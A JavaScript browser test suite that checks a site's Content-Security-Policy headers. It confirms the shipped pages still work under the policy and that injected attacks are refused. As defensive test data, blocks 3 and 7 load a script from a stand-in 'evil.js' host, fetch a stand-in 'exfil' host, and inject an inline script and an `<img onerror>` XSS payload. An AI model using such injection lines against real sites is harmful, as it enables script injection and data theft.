/* test_csp.mjs — the security headers we SHIP, exercised by the browser that has to obey them.
 *
 * THE HOLE THIS FILE CLOSES. `sim/web/_headers` is only ever sent by Cloudflare Pages.
 * Every browser suite in this repo serves the site from a plain static server that sends
 * NO headers at all — so until now nothing could tell the difference between a policy that
 * is safe and a policy that blanks the page. That is not a theoretical worry: a CSP that
 * refuses an inline `<script>` does not degrade, it stops the page dead, and the failure
 * would first be seen by a visitor on the live domain.
 *
 * So this suite parses the REAL `_headers` (never a restated copy of the policy — a
 * hard-coded string could pass while the shipped header said something else), serves every
 * page with it, and asserts each one still WORKS: the modules ran, the inline blocks ran,
 * and nothing was refused.
 *
 * IT HAS TEETH. Block 3 injects a script tag from another origin into the loaded page and
 * requires the policy to REFUSE it. Without that, a green run would be equally consistent
 * with "the policy is correct" and "no policy arrived at all".
 *
 * 2026-09-04 — `'unsafe-inline'` IS NOW ASSERTED GONE, and that changed what this file has
 * to do. Blocks 1–4 answered "can a script from ELSEWHERE run?". Blocks 5–8 answer "can a
 * script written INTO this page run?", which is the other half of XSS and the half that was
 * open until 2026-09-04. Three things are new and load-bearing:
 *
 *   · block 6 recomputes every SHA-256 in `script-src` from the pages ON DISK. It is a
 *     second, independent implementation of `sim/tools/build_csp_hashes.py` — deliberately
 *     in another language — so the generator cannot satisfy its own guard. A hash that
 *     drifts BLANKS THE PAGE, in production, where nothing local would see it;
 *   · block 7 INJECTS an inline `<script>` and an inline `onerror=` and requires both to be
 *     refused. Under the old policy both ran;
 *   · block 8 DRIVES each page rather than looking at it — the docs explorer searches, the
 *     SIM takes a typed turn and makes a QR code, the setup page encodes one — with a
 *     `securitypolicyviolation` listener installed before any page script runs. Thirteen
 *     inline blocks became thirteen `<script src>` tags in this pass, and a page whose glue
 *     failed to load still paints its markup and its CSS. "It looked fine" is not evidence.
 *
 *   node sim/test_csp.mjs
 */
import { readFileSync, readdirSync } from "node:fs";
import { join } from "node:path";
import { createHash } from "node:crypto";
import { requireBrowser, serveWeb, pagesHeaders, makeChecks, finish, web } from "./browser_harness.mjs";

const LABEL = "CSP + security-headers test";
const { puppeteer, chrome } = await requireBrowser(LABEL);
const { fails, ok, eq, count } = makeChecks();

const site = await serveWeb({ headers: true });
const H = pagesHeaders();

/* Served under a NON-local hostname, mapped to the loopback server. That is not cosmetic:
 * `_headers` is a Cloudflare Pages artifact and Pages serves a public hostname, so this is
 * the configuration the policy actually ships into. On a LOCAL host `env.js` additionally
 * probes the optional :8081/:8082 sidecars — which this same policy refuses, correctly and
 * only under `wrangler pages dev` (headers + localhost at once). Loading from 127.0.0.1
 * would fold that dev-only quirk into every assertion below and hide real refusals behind
 * an allowance. */
const HOST = `http://moxie.hosted.test:${site.port}`;

const browser = await puppeteer.launch({
  executablePath: chrome, headless: "new",
  args: ["--no-sandbox", "--use-gl=swiftshader", "--enable-unsafe-swiftshader",
         `--host-resolver-rules=MAP moxie.hosted.test 127.0.0.1:${site.port}`],
});

/* ONE known, pre-existing refusal, named exactly rather than matched loosely.
 *
 * The repo's own `README.md` is bundled into the docs explorer and embeds an image hosted
 * on github.com (`user-attachments/…`). `img-src 'self' data: blob:` predates this pass and
 * refuses it — correctly: this project's standing rule is that everything is vendored and
 * links are assumed to die, so an off-site image in a doc is the defect, not the policy.
 * It is listed here so the guard stays STRICT for everything else and so the exemption
 * cannot be inherited silently — fixing the README removes this constant. */
const KNOWN_REFUSALS = [/user-attachments.*violates.*img-src/i];

/** What the real `static.cloudflareinsights.com` sends, and what a module fetch needs. */
const CORS = { "Access-Control-Allow-Origin": "*" };

const POLICY_LINE = /Content Security Policy|Refused to (load|connect|execute|run|apply|frame)/i;
const isKnown = (e) => KNOWN_REFUSALS.some((k) => k.test(e));

/** Console lines that are a POLICY refusal we have NOT already accounted for. */
const cspErrors = (errs) => errs.filter((e) => POLICY_LINE.test(e) && !isKnown(e));

/* Each page, and the runtime fact that proves its scripts really ran under the policy.
 * A page that loads but whose inline block was refused looks fine to the naked eye and to
 * every structural check — the probe is what separates the two. */
const PAGES = [
  ["index.html", () => !!document.getElementById("bg-canvas")],
  ["setup.html", () => !!document.getElementById("bg-canvas") && !!window.moxieQR],
  ["cloud.html", () => !!document.getElementById("bg-canvas")],
  ["docs.html", () => !!document.getElementById("tree") &&
                      document.querySelectorAll("#tree a, #tree button, #tree li").length > 0],
  // `window.moxie` is the load-bearing one: it only exists if the ES MODULE resolved
  // through sim.html's inline `<script type="importmap">` and three.js loaded from
  // ./vendor. That is the single most CSP-fragile thing on the site.
  ["sim.html", () => !!window.moxie && !!window.moxieBridge && !!window.moxieAudio &&
                     !!window.moxieMode && !!window.moxieTypedTurn && !!window.moxieStub],
];

async function load(path) {
  const page = await browser.newPage();
  await page.setViewport({ width: 1440, height: 900 });
  /* The violation EVENT, not its console rendering, and installed before a single page
   * script runs. A console line is a sentence to regex; `securitypolicyviolation` carries
   * the directive and the blocked URI, and it fires for refusals that log nothing at all. */
  await page.evaluateOnNewDocument(() => {
    window.__cspViolations = [];
    document.addEventListener("securitypolicyviolation", (e) => {
      window.__cspViolations.push({
        directive: e.effectiveDirective || e.violatedDirective,
        blocked: e.blockedURI,
        sample: (e.sample || "").slice(0, 60),
      });
    });
  });
  const errs = [], notFound = [];
  page.on("console", (m) => { if (m.type() === "error") errs.push(m.text()); });
  page.on("pageerror", (e) => errs.push("PAGEERR " + e.message));
  // Which URLs actually 404'd, so the console line can be correlated with a real response
  // instead of forgiven on the strength of its text (see the loop below).
  page.on("response", (r) => { if (r.status() === 404) notFound.push(r.url()); });
  const res = await page.goto(`${HOST}/${path}`, { waitUntil: "domcontentloaded", timeout: 20000 });
  await new Promise((r) => setTimeout(r, 2500));
  return { page, errs, headers: res.headers(), notFound };
}

try {
  /* =====================================================================
   * 1. The policy itself — read off the file we ship, not off a memory of it.
   * =================================================================== */
  {
    const csp = H["Content-Security-Policy"] || "";
    ok(/(^|;\s*)script-src\s+'self'/.test(csp),
       `_headers must pin script-src to 'self' (got ${JSON.stringify(csp)})`);
    ok(/(^|;\s*)connect-src\s+'self'\s*(;|$)/.test(csp),
       "connect-src stays exactly 'self' — it is what refused the port-8081 fetch");

    /* THE ONE OFF-ORIGIN SCRIPT HOST, asserted by name. Cloudflare Pages injects its Web
     * Analytics beacon into every HTML response and we cannot edit that tag, so the policy
     * has to allow the host or log a violation on every single page load. `_headers` carries
     * the full reasoning; this pins it so it cannot be "tidied" away silently. */
    ok(/(^|;\s*)script-src\s[^;]*\bhttps:\/\/static\.cloudflareinsights\.com\b/.test(csp),
       "script-src allows Cloudflare's injected analytics beacon host");
    // ...and ONLY that one. Every other scheme-ful source in script-src would be a widening
    // nobody argued for, and this is where it gets caught.
    const scriptSrc = (csp.split(";").find((d) => d.trim().startsWith("script-src")) || "").trim();
    const hosts = scriptSrc.split(/\s+/).slice(1).filter((t) => /:/.test(t) && !/^'/.test(t));
    eq(JSON.stringify(hosts), JSON.stringify(["https://static.cloudflareinsights.com"]),
       "…and script-src names EXACTLY that one off-origin host, no other");
    ok(!/cloudflareinsights/.test(csp.split(";").find((d) => d.trim().startsWith("connect-src")) || ""),
       "connect-src does NOT name it: the beacon reports to a SAME-ORIGIN /cdn-cgi/rum (see _headers)");
    for (const d of ["object-src 'none'", "base-uri 'none'", "frame-ancestors 'none'", "form-action 'none'"])
      ok(csp.includes(d), `_headers must carry ${d}`);
    const hsts = H["Strict-Transport-Security"] || "";
    ok(/max-age=\d{7,}/.test(hsts), `HSTS must be set with a real max-age (got ${JSON.stringify(hsts)})`);
    eq(H["X-Content-Type-Options"], "nosniff", "nosniff is still there");
  }

  /* =====================================================================
   * 2. Every page still works with that policy actually applied.
   * =================================================================== */
  for (const [path, probe] of PAGES) {
    const { page, errs, headers, notFound } = await load(path);
    ok((headers["content-security-policy"] || "").includes("script-src"),
       `${path}: the browser really received the policy`);
    ok((headers["strict-transport-security"] || "").includes("max-age"),
       `${path}: …and HSTS`);
    eq(cspErrors(errs).length, 0,
       `${path}: NOTHING was refused by the policy — ${cspErrors(errs).slice(0, 3).join(" | ")}`);
    ok(await page.evaluate(probe),
       `${path}: its scripts actually ran under the policy (the inline blocks were not refused)`);
    /* Anything else on the console is a page fault, not a policy one, and is worth knowing.
     *
     * ONE 404 IS EXPECTED AND ONLY ONE: this harness is a static server, so `mode.js`'s
     * `GET /api/health` capability probe misses — that is the honest behaviour of a fork
     * with no Functions, and the site is built to be byte-identical when it happens. The
     * filter used to drop EVERY "status of 404" line, which meant any missing asset on any
     * shipped page slipped past the strictest console assertion this suite has. It is now
     * correlated with the 404 RESPONSES actually observed, and forgiven one for one, so a
     * genuinely missing file still fails. (`test_env_hosted.mjs` already worked this way;
     * this file did not.) */
    const expected404 = notFound.every((u) => /\/api\/health\b/.test(u));
    let budget = expected404 ? notFound.length : 0;
    const other = errs.filter((e) => {
      if (POLICY_LINE.test(e) || isKnown(e)) return false;
      if (budget > 0 && /Failed to load resource: the server responded with a status of 404/.test(e)) {
        budget--; return false;
      }
      return true;
    });
    eq(other.length, 0, `${path}: no other console errors — ${other.slice(0, 3).join(" | ")}`);
    await page.close();
  }

  /* =====================================================================
   * 3. TEETH — the policy is in force, and it refuses what it should.
   * =================================================================== */
  {
    const { page, errs } = await load("sim.html");
    const before = cspErrors(errs).length;
    eq(before, 0, "teeth: the page is clean before anything is injected");

    const loaded = await page.evaluate(() => new Promise((resolve) => {
      const s = document.createElement("script");
      s.src = "https://cdn.invalid.test/evil.js";
      s.onload = () => resolve("loaded");
      s.onerror = () => resolve("refused");
      document.head.appendChild(s);
      setTimeout(() => resolve("timeout"), 3000);
    }));
    eq(loaded, "refused",
       "teeth: a script from another origin is REFUSED — without script-src it would have run");
    await new Promise((r) => setTimeout(r, 400));
    ok(cspErrors(errs).length > before,
       "teeth: …and the browser logged the refusal, so the policy really is the one in force");

    const fetched = await page.evaluate(() =>
      fetch("https://exfil.invalid.test/x", { mode: "cors" }).then(() => "sent").catch(() => "blocked"));
    eq(fetched, "blocked", "teeth: connect-src still refuses an off-origin request");
    await page.close();
  }

  /* =====================================================================
   * 4. THE BEACON HOST — allowed by name, and by name ONLY.
   *
   * Cloudflare Pages injects `<script src="https://static.cloudflareinsights.com/…">` into
   * every HTML response. `script-src 'self'` refused it, and that refusal was on the live
   * console of every page load — a permanent error that drowns the next real one. So the
   * host is allowed. This block proves BOTH halves of that sentence, because an allowance
   * nobody checks is how a policy quietly becomes a wildcard:
   *
   *   · a script from `static.cloudflareinsights.com` RUNS, and
   *   · a script from the BARE `cloudflareinsights.com` — the beacon's own report host, one
   *     label away — is still REFUSED.
   *
   * Both are answered at the browser, so this suite still touches no network: a CSP refusal
   * happens BEFORE the request is issued, so a script that reaches the interceptor at all
   * is a script the policy permitted.
   * =================================================================== */
  {
    const page = await browser.newPage();
    await page.setViewport({ width: 1440, height: 900 });
    const errs = [];
    page.on("console", (m) => { if (m.type() === "error") errs.push(m.text()); });
    page.on("pageerror", (e) => errs.push("PAGEERR " + e.message));
    await page.setRequestInterception(true);
    page.on("request", (r) => {
      if (r.isInterceptResolutionHandled()) return;
      const u = r.url();
      // The real host sends CORS, and it must: Pages injects the tag with
      // `crossorigin="anonymous"` and `type="module"`, both of which make the fetch a CORS
      // fetch. A stub without the header would fail for a reason that has nothing to do
      // with the policy under test.
      if (/^https:\/\/static\.cloudflareinsights\.com\//.test(u))
        return r.respond({ status: 200, contentType: "text/javascript", headers: CORS,
                           body: "window.__beacon = 'ran';" });
      if (/^https:\/\/cloudflareinsights\.com\//.test(u))
        return r.respond({ status: 200, contentType: "text/javascript", headers: CORS,
                           body: "window.__sibling = 'ran';" });
      return r.continue();
    });
    await page.goto(`${HOST}/sim.html`, { waitUntil: "domcontentloaded", timeout: 20000 });
    await new Promise((r) => setTimeout(r, 1500));

    /** Add a script tag the way Pages injects the beacon, and report what happened. */
    const inject = (src) => page.evaluate((u) => new Promise((resolve) => {
      const s2 = document.createElement("script");
      s2.type = "module";
      s2.src = u;
      s2.onload = () => resolve("loaded");
      s2.onerror = () => resolve("refused");
      document.head.appendChild(s2);
      setTimeout(() => resolve("timeout"), 3000);
    }), src);

    eq(await inject("https://static.cloudflareinsights.com/beacon.min.js/vTESTONLY"), "loaded",
       "the injected Cloudflare beacon LOADS — the console error on every page load is gone");
    eq(await page.evaluate(() => window.__beacon || null), "ran", "…and actually executed");

    eq(await inject("https://cloudflareinsights.com/beacon.min.js/vTESTONLY"), "refused",
       "…while the BARE cloudflareinsights.com is still refused: the allowance is host-exact");
    eq(await page.evaluate(() => window.__sibling || null), null, "…and never ran");
    await new Promise((r) => setTimeout(r, 400));
    // Match the URL the browser NAMES as refused, not the line: every such line also
    // quotes the policy back, which now contains the word `static.` itself.
    ok(cspErrors(errs).some((e) => /'https:\/\/cloudflareinsights\.com\//.test(e)),
       "…with the refusal logged, so the policy really is the one in force");

    /* The connect-src half of the same question, checked rather than assumed. The beacon
     * reports through `navigator.sendBeacon` to the RELATIVE `/cdn-cgi/rum?…` (it only uses
     * the absolute `https://cloudflareinsights.com/cdn-cgi/rum` when the injected tag
     * carries no `version`, and ours carries one), so `connect-src 'self'` covers it and
     * does not have to be widened. `sendBeacon` returns false when CSP refuses it. */
    eq(await page.evaluate(() => navigator.sendBeacon("/cdn-cgi/rum?test", "x")), true,
       "the beacon's SAME-ORIGIN report path is permitted by connect-src 'self' as it stands");
    // ...and the off-origin one is still refused. Asserted with `fetch`, not `sendBeacon`:
    // Chrome queues a beacon and returns `true` before the policy check resolves, so
    // sendBeacon's return value is not a reliable witness for a REFUSAL (it is for the
    // permission above, where `true` is what a queued request means).
    eq(await page.evaluate(() =>
         fetch("https://cloudflareinsights.com/cdn-cgi/rum", { method: "POST", body: "x" })
           .then(() => "sent").catch(() => "blocked")), "blocked",
       "…and an off-origin report would still be refused — connect-src keeps its teeth");
    await page.close();
  }
  /* =====================================================================
   * 5. THE POLICY HAS NO INLINE ESCAPE HATCH LEFT.
   *
   * `'unsafe-inline'` in `script-src` is the whole XSS loader problem: with it, any markup
   * an attacker lands on the page executes. It stood in this policy from 2026-09-03 to
   * 2026-09-04 and `_headers` called it "the honest gap". Read off the shipped file.
   * =================================================================== */
  {
    const csp = H["Content-Security-Policy"] || "";
    const scriptSrc = (csp.split(";").find((d) => d.trim().startsWith("script-src")) || "").trim();
    ok(!/'unsafe-inline'/.test(scriptSrc),
       `script-src must NOT carry 'unsafe-inline' (got ${JSON.stringify(scriptSrc)})`);
    /* `'unsafe-hashes'` is the OTHER hatch, and it is not needed here: it exists only to
     * let hashes cover inline event-handler ATTRIBUTES, and this bundle has none (block 6
     * proves that from the files rather than trusting this line). It is asserted anyway
     * because it is the obvious thing a future pass would reach for. */
    ok(!/'unsafe-hashes'/.test(csp), "the CSP must NOT carry 'unsafe-hashes' anywhere");
    ok(!/'unsafe-eval'/.test(csp), "…nor 'unsafe-eval'");
    /* The ONLY quoted sources permitted in script-src: 'self' and SHA-256 hashes. Anything
     * else quoted is a keyword, and every script-src keyword other than 'self' is a
     * widening. `'strict-dynamic'` in particular would make the host allowance below
     * meaningless, which is exactly the kind of change that reads as tightening. */
    const quoted = scriptSrc.split(/\s+/).filter((t) => t.startsWith("'"));
    const stray = quoted.filter((t) => t !== "'self'" && !/^'sha256-[A-Za-z0-9+/]+={0,2}'$/.test(t));
    eq(JSON.stringify(stray), "[]",
       `script-src's quoted sources must be 'self' + sha256 hashes only (stray: ${stray.join(" ")})`);
  }

  /* =====================================================================
   * 6. THE HASHES MATCH THE PAGES ON DISK — the blank-page guard.
   *
   * THIS IS THE ASSERTION THE WHOLE SLICE HANGS ON. A hash that drifts from the block it
   * covers does not degrade: the browser refuses the block and the page goes BLANK, in
   * production, because a static `_headers` is only ever sent by Pages. `sim/tools/
   * build_csp_hashes.py` generates the header; this recomputes it INDEPENDENTLY, in a
   * different language, from the same files — so a bug in the generator cannot satisfy its
   * own guard. `sim/tests/test_csp_hashes.py` is the fast, browser-free version of this.
   * =================================================================== */
  {
    const INLINE = /<script(?![^>]*\ssrc\s*=)([^>]*)>([\s\S]*?)<\/script>/g;
    const pages = readdirSync(web).filter((f) => f.endsWith(".html")).sort();
    ok(pages.length === 5, `expected the five shipped pages, got ${pages.length}: ${pages}`);

    const blocks = [];
    const handlers = [];
    for (const name of pages) {
      const src = readFileSync(join(web, name), "utf8");
      for (const m of src.matchAll(INLINE))
        blocks.push({ name, attrs: (m[1] || "").trim(), body: m[2],
                      line: src.slice(0, m.index).split("\n").length });
      /* The inline event-handler ATTRIBUTE — `<button onclick="f()">` — is the one thing no
       * hash in this policy can rescue, and its failure mode is the nastiest on the page:
       * it does not throw, it simply never fires. NOTE WHAT THIS DOES NOT MATCH, because
       * `_headers` was wrong about it until 2026-09-04 and counted ten of these: an
       * `el.onclick = function(){}` in a .js file assigns a function OBJECT and is not an
       * inline script at all. Only markup is scanned here, which is the whole distinction. */
      for (const m of src.matchAll(/<[^>!][^>]*?\son[a-z]+\s*=\s*["'][^"']*["'][^>]*>/gi))
        handlers.push(`${name}:${src.slice(0, m.index).split("\n").length}`);
      for (const m of src.matchAll(/(?:href|src|action|formaction)\s*=\s*["']\s*javascript:/gi))
        handlers.push(`${name}:${src.slice(0, m.index).split("\n").length} javascript: URL`);
    }
    eq(JSON.stringify(handlers), "[]",
       `no shipped page may carry an inline on*= attribute or javascript: URL — ` +
       `they need 'unsafe-hashes', which this policy does not grant, and they fail SILENTLY ` +
       `(found: ${handlers.join(", ")})`);

    /* The surface, pinned by name. Thirteen of the original fourteen inline blocks were
     * moved into files rather than hashed — a file cannot drift. The one that remains
     * cannot be a file in any browser: `<script type="importmap" src>` was dropped from the
     * spec. If this count ever grows, the fix is almost always another file, not another
     * hash, and this is where that decision gets forced into the open. */
    eq(blocks.length, 1,
       `exactly ONE inline <script> should remain on the whole site — ` +
       `${blocks.map((b) => `${b.name}:${b.line}`).join(", ")}`);
    ok(blocks.every((b) => b.name === "sim.html" && /type="importmap"/.test(b.attrs)),
       "…and it is sim.html's importmap, the one block that genuinely cannot be external");

    const want = blocks.map((b) =>
      "'sha256-" + createHash("sha256").update(b.body, "utf8").digest("base64") + "'").sort();
    const csp = H["Content-Security-Policy"] || "";
    const scriptSrc = (csp.split(";").find((d) => d.trim().startsWith("script-src")) || "").trim();
    const have = scriptSrc.split(/\s+/).filter((t) => t.startsWith("'sha256-")).sort();
    eq(JSON.stringify(have), JSON.stringify(want),
       "script-src's hashes must equal a fresh SHA-256 of every inline block on disk — " +
       "A MISMATCH BLANKS THE PAGE. Run: python3 sim/tools/build_csp_hashes.py");
  }

  /* =====================================================================
   * 7. TEETH FOR THE NEW HALF — an inline <script> is REFUSED.
   *
   * Block 3 proves an off-ORIGIN script cannot load. That was already true before this
   * pass. What was NOT true is this: until 2026-09-04 an attacker who could land markup on
   * the page — a reflected parameter, a poisoned doc, a compromised fixture — got
   * execution for free, because `'unsafe-inline'` ran whatever was written. This is the
   * assertion that goes red the moment that keyword comes back.
   * =================================================================== */
  {
    const { page, errs } = await load("sim.html");
    eq(cspErrors(errs).length, 0, "inline teeth: the page is clean before anything is injected");

    const ran = await page.evaluate(() => {
      const s = document.createElement("script");
      s.textContent = "window.__inlineRan = 'ran';";
      document.head.appendChild(s);
      return window.__inlineRan || null;
    });
    eq(ran, null,
       "inline teeth: an injected inline <script> does NOT execute — with 'unsafe-inline' it would have");

    /* The same thing by the route an XSS payload actually takes. `innerHTML` never runs a
     * plain <script>, so this uses the classic `<img onerror>`, which DOES fire — and which
     * `'unsafe-hashes'` would have re-enabled. Two different doors, one lock. */
    const fired = await page.evaluate(() => new Promise((resolve) => {
      window.__handlerRan = null;
      const d = document.createElement("div");
      d.innerHTML = '<img src="data:," onerror="window.__handlerRan = \'ran\'">';
      document.body.appendChild(d);
      setTimeout(() => resolve(window.__handlerRan), 600);
    }));
    eq(fired, null, "inline teeth: an injected inline event-handler attribute does NOT fire either");

    await new Promise((r) => setTimeout(r, 400));
    ok(cspErrors(errs).length >= 1,
       "inline teeth: …and the browser logged the refusals, so the policy really is in force");

    /* THE OTHER HALF OF THE SAME QUESTION, and the reason this is not just a tightening
     * nobody checked: the ONE block that IS hashed still runs. `window.moxie` exists only
     * if the ES module graph resolved through sim.html's importmap — so if that hash were
     * wrong, this page would be the blank one. */
    ok(await page.evaluate(() => !!window.moxie),
       "…while the HASHED importmap still resolved: three.js loaded and the SIM booted");
    await page.close();
  }

  /* =====================================================================
   * 8. EVERY PAGE STILL *WORKS*, not merely renders — under the new policy.
   *
   * A CSP that blanks a page is worse than `'unsafe-inline'`, and "it looked fine" is not
   * evidence: thirteen inline blocks became thirteen `<script src>` tags, and a page whose
   * glue silently failed to load still paints its markup, its CSS and its background. So
   * each page is DRIVEN here — the docs explorer searches, the SIM takes a typed turn and
   * makes a QR code, the setup page encodes one, the console renders its fixture — with a
   * `securitypolicyviolation` listener installed BEFORE any page script runs.
   *
   * That listener is the strict part. Block 2 reads the CONSOLE, which is a rendering of
   * the violation; this reads the EVENT, which is the violation itself, and carries the
   * directive and blocked URI rather than a sentence to regex.
   * =================================================================== */
  {
    /* Violations the page recorded — ALL of them.
     *
     * This used to filter out `/user-attachments/`, "the one pre-existing img-src refusal":
     * `README.md` embedded its hero shot from GitHub's CDN, `img-src 'self' data: blob:`
     * refused it, correctly, on every load of docs.html, and the exemption meant the suite
     * could not see it. A carve-out for a known violation is a carve-out for the next one
     * too — it matched a substring, not a specific finding. The image is vendored as of
     * 2026-09-04 (`sim/web/img/sim-hero.png`), so the exemption is gone and this is now
     * what it always claimed to be: ZERO. */
    const violations = (p) => p.evaluate(() => window.__cspViolations || []);
    const show = (vs) => vs.map((v) => `${v.directive} ⟵ ${v.blocked}${v.sample ? " «" + v.sample + "»" : ""}`).join(" | ");

    /* --- sim.html: a typed turn end to end, and the QR card ------------------- */
    {
      const { page } = await load("sim.html");
      await page.type("#speech-input", "hello moxie");
      await page.click("#speech-btn");
      await new Promise((r) => setTimeout(r, 3500));
      const t = await page.evaluate(() => (document.getElementById("transcript") || {}).textContent || "");
      ok(/hello moxie/.test(t) && /Moxie/.test(t),
         `sim.html: a typed turn reaches the transcript AND is answered (got ${JSON.stringify(t.slice(0, 90))})`);

      await page.click("#qr-make");
      await new Promise((r) => setTimeout(r, 900));
      const qr = await page.evaluate(() => {
        const c = document.getElementById("qr-canvas");
        const d = c.getContext("2d").getImageData(0, 0, c.width, c.height).data;
        let dark = 0;
        for (let i = 0; i < d.length; i += 4) if (d[i] < 128) dark++;
        return { dark, status: (document.getElementById("qr-status") || {}).textContent || "" };
      });
      ok(qr.dark > 500, `sim.html: the QR card actually drew a code (${qr.dark} dark px)`);
      ok(/\{/.test(qr.status), `sim.html: …and reported the payload it encoded (${qr.status.slice(0, 40)})`);
      const v = await violations(page);
      eq(v.length, 0, `sim.html: ZERO securitypolicyviolation events across a whole turn — ${show(v)}`);
      await page.close();
    }

    /* --- docs.html: search, then open a hit ----------------------------------- */
    {
      const { page } = await load("docs.html");
      /* The home document is README.md, and its hero is the image that produced the one
       * violation this policy actually caught in production. Assert the PIXELS, not the
       * markup: a 404 still gives you an `<img>` element, and a CSP refusal gives you one
       * too — both with `naturalWidth === 0`. Checked BEFORE the search below navigates
       * away from the README. */
      const hero = await page.evaluate(() => {
        const i = document.querySelector("article img");
        return i ? { src: i.getAttribute("src"), w: i.naturalWidth, h: i.naturalHeight } : null;
      });
      ok(hero && hero.w > 0 && hero.h > 0,
         `docs.html: the README hero image actually DECODED (${JSON.stringify(hero)})`);
      ok(hero && /^img\//.test(hero.src || ""),
         `docs.html: …from this origin, the repo-relative src remapped onto the site root (${hero && hero.src})`);
      await page.type("#q", "projectorfanpid");        // a body-only term: search must have run
      await new Promise((r) => setTimeout(r, 1200));
      const hits = await page.evaluate(() => document.querySelectorAll("#tree a").length);
      ok(hits > 0, `docs.html: full-text search filters the tree (got ${hits} hits)`);
      await page.evaluate(() => { const a = document.querySelector("#tree a"); if (a) a.click(); });
      await new Promise((r) => setTimeout(r, 1400));
      const doc = await page.evaluate(() => ({
        len: (document.querySelector("article") || { textContent: "" }).textContent.length,
        marks: document.querySelectorAll("article mark, article .hl, article em").length }));
      ok(doc.len > 2000, `docs.html: the hit opens and renders Markdown (${doc.len} chars)`);
      ok(doc.marks > 0, "docs.html: …with the search term highlighted in it");
      const v = await violations(page);
      eq(v.length, 0, `docs.html: ZERO securitypolicyviolation events — ${show(v)}`);
      await page.close();
    }

    /* --- setup.html: encode a Wi-Fi code -------------------------------------- */
    {
      const { page } = await load("setup.html");
      await page.type("#ssid", "TestNet");
      await page.click("#go-wifi");
      await new Promise((r) => setTimeout(r, 700));
      const out = await page.evaluate(() => {
        const c = document.getElementById("cv-wifi");
        const d = c.getContext("2d").getImageData(0, 0, c.width, c.height).data;
        let dark = 0;
        for (let i = 0; i < d.length; i += 4) if (d[i] < 128) dark++;
        return { dark, payload: (document.getElementById("pl-wifi") || {}).textContent || "" };
      });
      ok(out.dark > 500, `setup.html: the Wi-Fi QR drew (${out.dark} dark px)`);
      ok(/"ssid":\s*"TestNet"/.test(out.payload),
         `setup.html: …encoding the SSID that was typed (${out.payload.slice(0, 50)})`);
      const v = await violations(page);
      eq(v.length, 0, `setup.html: ZERO securitypolicyviolation events — ${show(v)}`);
      await page.close();
    }

    /* --- cloud.html + index.html: their glue ran ------------------------------ */
    {
      const { page } = await load("cloud.html");
      const c = await page.evaluate(() => ({
        tabs: document.querySelectorAll(".tab").length,
        body: (document.querySelector("[data-panel]") || { textContent: "" }).textContent.length }));
      eq(c.tabs, 5, "cloud.html: the console built its five tabs from the fixture");
      ok(c.body > 100, `cloud.html: …and rendered a panel (${c.body} chars)`);
      const v1 = await violations(page);
      eq(v1.length, 0, `cloud.html: ZERO securitypolicyviolation events — ${show(v1)}`);
      await page.close();

      const { page: ip } = await load("index.html");
      // The sparkles are built by home.js and by nothing else, so their presence is a
      // direct witness that the extracted file ran (the CSS alone paints none).
      const n = await ip.evaluate(() => document.querySelectorAll("#bg .spark").length);
      ok(n > 0, `index.html: home.js ran — it built ${n} sparkles`);
      const v2 = await violations(ip);
      eq(v2.length, 0, `index.html: ZERO securitypolicyviolation events — ${show(v2)}`);
      await ip.close();
    }
  }

} catch (e) {
  fails.push("threw: " + (e && e.stack ? e.stack.split("\n").slice(0, 4).join(" / ") : e));
} finally {
  await browser.close().catch(() => {});
  site.close();
}

finish(LABEL, { fails, count });
